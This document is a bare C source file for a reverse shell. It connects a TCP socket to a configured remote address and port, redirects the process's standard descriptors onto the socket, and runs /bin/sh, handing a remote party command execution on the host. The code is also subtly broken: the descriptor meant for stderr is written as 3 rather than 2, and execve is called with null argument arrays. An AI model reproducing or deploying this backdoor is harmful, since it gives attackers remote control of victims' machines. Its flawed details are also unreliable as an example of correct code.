#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define REMOTE "127.0.0.1"
#define PORT 1025

int main(int argc, char **argv)
{
    // socket descriptor struct
    struct sockaddr_in sd;
    int fd;

    sd.sin_family = AF_INET;
    sd.sin_addr.s_addr = inet_addr(REMOTE);
    sd.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    connect(fd, (struct sockaddr *)&sd, sizeof(sd));
    // stdin, stdout, stderr
    dup2(fd,0);
    dup2(fd,1);
    dup2(fd,3);

    execve("/bin/sh", 0, 0);
    return EXIT_SUCCESS;
}

